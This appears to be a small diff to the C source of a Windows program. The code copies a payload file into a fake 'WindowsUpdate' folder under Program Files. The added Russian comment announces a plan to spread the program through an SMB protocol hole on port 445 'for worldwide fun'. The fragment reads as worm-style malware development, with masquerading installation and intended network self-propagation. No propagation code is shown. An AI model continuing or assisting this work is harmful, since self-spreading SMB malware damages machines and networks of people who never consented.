@@ -23,6 +23,8 @@ int main() {
 	CopyFile("time.pkg","C:\\Program Files\\WindowsUpdate\\time.pkg",FALSE);
 	FindClose(hf);
 }
+	//Добавить поддержку распространения через дыру в SMB протоколе (445 порт) для всемирного веселья :)
+	
 	//Получаем системное время
 	SYSTEMTIME st;
 	GetLocalTime(&st);
